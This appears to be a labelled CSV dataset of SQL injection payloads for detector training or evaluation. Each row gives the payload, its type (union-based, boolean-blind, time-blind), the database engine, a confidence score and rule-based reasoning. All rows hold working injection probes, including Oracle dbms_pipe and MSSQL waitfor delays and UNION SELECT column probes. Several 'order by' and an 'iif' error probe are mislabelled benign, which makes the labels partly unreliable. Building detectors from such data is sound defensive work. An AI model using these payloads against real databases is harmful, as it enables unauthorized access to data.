id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19908,"1' ) where 2775 = 2775 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
19969,"1"" ) where 3943 = 3943 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
19897,"iif ( 7953 = 3021,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
19899,1 where 9620 = 9620 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
19911,"1"" ) ) ) order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 20 chars.,2
19992,-9389' ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 20 chars.,2
19801,-8684' where 9820 = 9820 or 6844 = 5105,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,2
19802,"1%' ) ) ) union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
19810,"1%' ) union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
19816,"1'|| ( select 'zvpl' where 5877 = 5877 union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
19818,"-6772"" ) ) or 9323 = 9323#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
19822,"-3769"" ) ) ) union all select 8456#",union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
19826,-4828%' ) or 8678 = 5745#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
19827,"1%"" ) ) ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
19832,"1"" ) and 7533 = 7533 and ( ""yqzq"" = ""yqzq",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2
19835,"-3441' ) ) as dxvt where 9291 = 9291 union all select 9291,9291,9291#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
19839,"1"" ) ) union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
19841,"1'+ ( select 'ejox' where 2719 = 2719 union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
19845,"-3865' ) union all select 4935,4935,4935,4935,4935--",union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
19848,1' ) and 8404 = 8651#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
19849,"1%"" and 4595 = 4595#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
19861,"-2783' where 1494 = 1494 union all select 1494,1494,1494,1494,1494,1494--",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
19866,"-8128"" ) ) as ovjz where 7375 = 7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",union_based,generic,0.7,UNION-based payload detected. Payload length: 100 chars.,2
19867,"1%' ) union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 34 chars.,2
19869,"1' in boolean mode ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 84 chars.,2
19871,"1"" ) as upyn where 6185 = 6185 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 99 chars.,2
19874,1' ) ) as sjzf where 9997 = 9997 and 4193 = 5408,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
19884,"-6305"" ) ) ) or 8097 = 2048 and ( ( ( ""euyy"" like ""euyy",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 55 chars.,2
19887,"-4901' union all select 1536,1536,1536,1536,1536,1536,1536#",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
19891,"-2434 ) union all select 8310,8310,8310,8310,8310--",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
19892,"-2112 union all select 2995,2995,2995,2995,2995--",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
19895,-5365 or 7517 = 5726--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
19901,"1"" ) and 4760 = 2922",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
19903,"-5825 ) as mflf where 3999 = 3999 or make_set ( 1492 = 7153,7153 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 69 chars.,2
19904,"1"" union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
19914,"-9873"" union all select 8020,8020,8020,8020,8020,8020#",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
19915,"1 where 8045 = 8045 union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
19919,-7369 or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
19926,1' in boolean mode ) and 2006 = 2006,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 36 chars.,2
19927,"1"" where 1452 = 1452 union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
19928,-2790' ) ) or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
19929,-2393%' ) ) union all select 2772--,union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
19932,"1' where 3700 = 3700 union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
